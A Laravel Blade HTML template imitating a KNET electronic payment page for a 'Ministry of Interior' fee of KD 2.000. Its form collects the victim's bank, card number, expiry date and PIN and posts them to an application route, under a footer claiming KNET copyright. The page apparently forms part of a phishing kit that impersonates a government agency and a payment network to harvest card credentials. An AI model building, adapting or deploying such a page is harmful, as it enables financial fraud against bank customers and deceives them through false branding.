<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=500, initial-scale=1">
	
    <title>نظام تسديد - الدفع الإلكتروني</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
		.container {
			width: 100%;
			max-width: 1200px;
			margin: 0 auto;
		}
        .custom-box {
            border: 2px solid #3288d1;
            border-radius: 10px;
            box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.4);
            padding: 20px;
            background-color: #ffffff;
            text-align: center;
            position: relative;
            max-width: 500px;
            max-height: 183px;
            margin: auto;
        }
        .logo-container {
            width: 100%;
            height: 150px;
            background-color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            color: #777;
            margin-bottom: 10px;
        }
        .logo-placeholder {
            width: 100px;
            height: 100px;
            background-color: #e0e0e0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            color: #777;
            margin: 0 auto 10px auto;
        }
        .divider {
            width: 85%;
            height: 0.2px;
            background-color: rgba(0, 0, 0, 0.2);
            box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.4);
            margin: -19px auto 0 auto;
        }
        .billing-title {
            font-size: 16px;
            font-weight: bold;
            color: #3288d1;
            text-align: left;
            margin-top: 25px;
            margin-left: 20px;
            font-weight: bold;
        }






        .billing-info-merchant {
            font-size: 16px;
            font-weight: bold;
            color: #2a71ad;
            text-align: left;
            left: 7px;
            width: 30%;
            position: relative;
            top: 15px;
        }
        
        .billing-value-Ministry {
            font-size: 13px;
            font-weight: bold;
            position: relative;
            color: #454e5f;
            text-align: left;
            left: 10px;
            width: 70%;
            position: relative;
            top: 16px;
            
        }

        
        .billing-info-amount {
    font-size: 16px;
    font-weight: bold;
    color: #2a71ad;
    text-align: left;
    left: 7px;
    width: 30%;
    position: relative;
    top: -8px;
}

 .billing-value-KD {
    font-size: 13px;
    font-weight: bold;
    position: relative;
    color: #454e5f;
    text-align: left;
    left: 10px;
    width: 70%;
    position: relative;
    top: -8px;

        }

        


        
        
        .billing-info-bn {
            font-size: 16px;
            font-weight: bold;
            color: #2a71ad;
            text-align: left;
            left: -45px;
            width: 30%;
            position: relative;
            top: -15px;
        }

        .billing-info-cn {
            font-size: 16px;
            font-weight: bold;
            color: #2a71ad;
            text-align: left;
            left: 5px;
            width: 30%;
            position: relative;
            top: 33px;
        }

        .billing-info-ed {
            font-size: 16px;
            font-weight: bold;
            color: #2a71ad;
            text-align: left;
            left: 5px;
            width: 30%;
            position: relative;
            top: -43px;
        }

        .billing-info-pin{
            font-size: 16px;
            font-weight: bold;
            color: #2a71ad;
            text-align: left;
            left: 5px;
            width: 30%;
            position: relative;
            top: 5px;
        }

        


        

        
        

        .billing-value {
            font-size: 13px;
            font-weight: bold;
			position: relative;
            color: #454e5f;
            text-align: left;
			left: 10px;
            width: 70%;
        }
        .billing-row {
            display: flex;
            align-items: center;
            justify-content: start;
            margin-top: 10px;
        }
        .select-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 10px;
            padding-left: 50px;
            padding-right: 50px;
        }
        .select-row select {
			margin-left: 20px; 
            width: 70%;
            padding: 5px;
            border: 1px solid #000000;
        }
        .select-row button {
            background-color:rgb(15, 44, 70);
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
        }
		select {
			appearance: auto; 
			font-family: Arial, sans-serif;
			font-size: 14px;
			padding: 4px;
			border: 0px solid black;
			width: 2100px ;
			height: 28px;
		}

		.old-select {
			font-family: Arial, sans-serif;
			font-size: 14px;
			border: 1px solid #000;
			background-color: #f8f8f8;
			padding: 3px;
			width: 15%;
			height: 26px;

		}





select:focus {
    border-color: blue; 
    outline: none; 
    box-shadow: 0 0 5px rgba(0, 0, 255, 0.5);
}






		.old-select-bn {
		    font-size: 13px;
    font-weight: bold;
    border: 1px blue;
    border-radius: 90px;
    color: #1d1c1cd5;
    position: relative;
    top: -15px;

		}
		


        .old-select-cn {
            width: 94%;
            max-width: 158px;
            padding: 8px;
            font-size: 14px;
            border: 3px solid rgb(33, 87, 134);
            border-radius: 6px;
            transition: border-color 0.3s ease-in-out;
            outline: none;
            position: relative;
            top: -6px;
            left: 35px;
            height: 27px;
        }

        .old-select-cn:focus {
            border-color: #3288d1; 
            box-shadow: 0 0 5px rgba(50, 136, 209, 0.5); 


        }

		.payment-banner {
            width: 100%;
            max-width: 500px; 
            display: block;
            margin: 0 auto 15px auto;
            border-radius: 10px;
        }





        .footer
        {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #777;
        }
        #mm:focus {
            border-color: blue; /* تحديد لون الإطار */
            outline: none; /* إزالة الـ outline الافتراضي */
            box-shadow: 0 0 5px rgba(0, 0, 255, 0.9); /* تأثير ظل أزرق خفيف */
        }
    </style>
</head>
<body>
    <div class="container mt-5">
        <img src="{{asset('image/pc.jpg')}}" alt="Payment Image" class="payment-banner">
		<div class="custom-box">
            <img src="{{asset('image/tasdeed.png')}}" alt="" style="width: 233px; position:relative; top: --8px;">
            <div class="billing-row mtb-1">
                <div class="billing-info-merchant">Merchent:</div>
                
                <div class="billing-value-Ministry">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ministry of Interior</div>
            </div>
            <span>______________________________________________________________________</span>            
        
            <div class="billing-row" style="margin-bottom: 5px;">
                <div class="billing-info-amount">Amount:</div>
                <div class="billing-value-KD">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KD 2.000</div>
            </div>
    </div>
            <!-- ------------------------------------------- -->
            <!-- ------------------------------------------- -->
            <!-- ------------------------------------------- -->
            <!-- ------------------------------------------- -->
            <!-- ------------------------------------------- -->
            @if ($errors->any())
    <div style="color: red;">
        <ul>
            @foreach ($errors->all() as $error)
                <li>{{ $error }}</li>
            @endforeach
        </ul>
    </div>
@endif
            <form  action="{{ route('final') }}" method="POST">
                      @csrf 
                      <input type="hidden" name="name" value="{{ $name }}"> 
                        <div class="container mt-4">
                                <div class="custom-box">
                                <div class="select-row">
                                    <label for="bank-select" class="billing-info-bn" style="white-space: nowrap; margin-right: 7px; ">Select Your Bank:</label>
                                    <select name="bank-name" id="bank-name" class="old-select-bn" style="
                                            font-size: 13px;
                                            font-weight: bold;
                                            border: 1px blue;
                                            background-color: #f3f2f2;
                                            border-radius: 90px;
                                            color: #1d1c1cd5;
                                            position: relative;
                                            width: 230px;
                                            left: -2px;
                                            height: 26px;
                                            top: -10px;
                                            ">
                                        <option value="" >select your bank</option>
                                            @php
                                                $banks = [
                                                    "Al Ahli Bank of Kuwait [ABK]",
                                                    "Al Rajhi Bank [Rajhi]",
                                                    "Bank of Bahrain Kuwait [BBK]",
                                                    "Boubyan Bank [Boubyan]",
                                                    "Burgan Bank [Burgan]",
                                                    "Commercial Bank of Kuwait [CBK]",
                                                    "Doha Bank [Doha]",
                                                    "Gulf Bank of Kuwait [GBK]",
                                                    "KFH [TAM]",
                                                    "Kuwait Finance House [KFH]",
                                                    "Kuwait International Bank [KIB]",
                                                    "National Bank of Kuwait [NBK]",
                                                    "NBK [Weyay]",
                                                    "Qatar National Bank [QNB]"
                                                ];
                                            @endphp

                                            @foreach ($banks as $bank)
                                                <option id="bank-name" value="{{ $bank }}">{{ $bank }}</option>
                                            @endforeach
                                        </select>
                                </div>


                                <div style="position:relative ;">
                            <span style="position:  absolute;top: -4px;left: 0;width: 100%;height: 1px;background-color: black;"></span>
                        </div>                    
                            
                            <div class="billing-row">
                                    <label for="card" class="billing-info-cn">Card Number:</label>
                                    <select name="card" id="card" class="old-select" style="
                                    margin-left: 10px;
                                    margin-right:2px;
                                    font-size: 13px;
                                    font-weight: bold;
                                    border: 1px blue;
                                    border-radius: 90px;
                                    color: #1d1c1cd5;
                                    background-color:#f3f2f2;
                                    position: relative;
                                    top: -5px;
                                    left: 34px;
                                    height:23px;
                                    ">
                                        <option value="">Prefix</option>
                                    </select>
                                    <input type="text" name="card-number" id="card-number" class="old-select-cn">	
                                </div>       

                                <div style="position:relative ;">
                            <span style="position:  absolute;top: 0px;left: 0;width: 100%;height: 1px;background-color: black;"></span>
                        </div>


                                <div class="billing-row">
                                <label class="billing-info-ed">Expiration Date:</label>
                                
                                <select name="month" id="month" style="
                                    margin-left: 10px;
                                    margin-right: 2px;
                                    font-size: 13px;
                                    font-weight: bold;
                                    border: 1px blue;
                                    border-radius: 90px;
                                    color: #1d1c1cd5;
                                    background-color: #f3f2f2;
                                    position: relative;
                                    top: -3px;
                                    left: 34px;
                                    width: 69px;
                                    height: 23px;
                                    ">
                                    <option value="">MM</option>

                                    @for ($month = 1; $month <= 12; $month++)
                                        <option id="month" value="{{ str_pad($month, 2, '0', STR_PAD_LEFT) }}">
                                            {{ str_pad($month, 2, '0', STR_PAD_LEFT) }}
                                        </option>
                                    @endfor
                                        </select>

                                <select name="year" id="year" style="
                                        margin-left: 10px;
                                        margin-right: 2px;
                                        font-size: 13px;
                                        font-weight: bold;
                                        border: 1px blue;
                                        border-radius: 90px;
                                        color: #1d1c1cd5;
                                        background-color: #f3f2f2;
                                        position: relative;
                                        top: -3px;
                                        left: 35px;
                                        width: 150px;
                                        height: 23px;
                                    ">
                                    <option value="">YYYY</option>
                                    @for ($year = 2025; $year <= 2070; $year++)
                                        <option id="year" value="{{ $year }}">{{ $year }}</option>
                                    @endfor         
                                        </select>
                            </div>

                                
                            <div style="position:relative ;">
                            <span style="position:  absolute;top: 6px;left: 0;width: 100%;height: 1px;background-color: black;"></span>
                        </div>
                                                    
                            <div class="billing-row">
                                <label class="billing-info-pin">PIN:</label>
                                <input name="pin" id="pin" type="password" style="
                                        margin-left: 10px;
                                        position: relative;
                                        width: 230px;
                                        font-size: 14px;
                                        border: 3px solid rgb(33, 87, 134);
                                        border-radius: 6px;
                                        transition: border-color 0.3s ease-in-out;
                                        outline: none;
                                        position: relative;
                                        top: 6px;
                                        left: 37px;
                                        text-align:center;
                            ">
                            
                        </div>
                    </div>


                        <div class="container mt-4">
                            <div class="custom-box">
                                
                                    
                        <div class="buttons-container" style="text-align: center; margin-top: 13px; display: flex; justify-content: center; gap: 10px;">
                            <button type="submit" style=" border-radius: 4px; width: 50%; height: 30px; color:#1d1c1cd5; background-color: #e6e6e6; border: 1px solid #999; padding: 5px 15px; font-family: Arial, sans-serif; font-size: 14px; font-weight: bold; cursor: pointer;">submit</button>
                            <a href="/welcome" style=" border-radius: 4px; display: inline-block; text-align: center; line-height: 30px; width: 50%; height: 30px; color:#1d1c1cd5; background-color: #e6e6e6; border: 1px solid #999; font-family: Arial, sans-serif; font-size: 14px; font-weight: bold; text-decoration: none; cursor: pointer;">
                                Cancel
                            </a>
                        </div>
                            
                        
                    </div>
                </form>

                    </div>	
                </div>
        </div>	
    </div>
	<div class="footer">
		All Rights Reserved. Copyright 2025 &copy;<br>
		<span style="color: #3288d1;">
			The Shared Electronic Banking Services Company - KNET
		<//span>
	</div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    


    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>



</body>

</html>